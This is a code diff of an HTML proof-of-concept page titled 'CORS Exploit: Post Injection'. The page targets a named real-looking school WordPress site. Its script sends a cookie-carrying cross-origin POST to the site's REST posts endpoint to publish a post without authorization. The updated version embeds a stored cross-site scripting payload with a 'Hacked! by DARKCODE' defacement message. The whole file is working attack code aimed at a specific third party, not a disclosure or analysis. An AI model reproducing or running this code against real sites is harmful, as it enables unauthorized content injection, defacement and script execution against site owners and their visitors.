@@ -1,29 +1,36 @@
 <!DOCTYPE html>
-<html>
-<head><title>PoC: Add Post</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CORS Exploit: Post Injection</title>
+</head>
 <body>
-<h2>Creating post via CORS attack</h2>
-<script>
-fetch("https://lahanparagon.edu.np/wp-json/wp/v2/posts", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    title: "CORS Attack Test by dark code",
-    content: "If you see this, the API is vulnerable.",
-    status: "publish"  // could be "draft" or "private"
-  })
-})
-.then(response => response.json())
-.then(data => {
-  console.log("Response:", data);
-  alert("Post attempt complete. Check console/logs.");
-})
-.catch(error => {
-  console.error("Error:", error);
-});
-</script>
+  <h2>CORS Exploit Demo</h2>
+  <button onclick="sendExploit()">Click to Inject Post</button>
+  <pre id="output" style="margin-top: 20px; white-space: pre-wrap;"></pre>
+
+  <script>
+    function sendExploit() {
+      fetch("https://lahanparagon.edu.np/wp-json/wp/v2/posts", {
+        method: "POST",
+        credentials: "include", // includes session cookies
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          title: "Injected by CORS Exploit",
+          content: "<h1>Injected Post Content</h1><script>alert('Hacked! by DARKCODE , KEEP YOUR LRVRL UP')</script>",
+          status: "publish"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("output").textContent = "✅ Exploit Successful:\n\n" + JSON.stringify(data, null, 2);
+      })
+      .catch(err => {
+        document.getElementById("output").textContent = "❌ Exploit Failed:\n\n" + err.message;
+      });
+    }
+  </script>
 </body>
 </html>
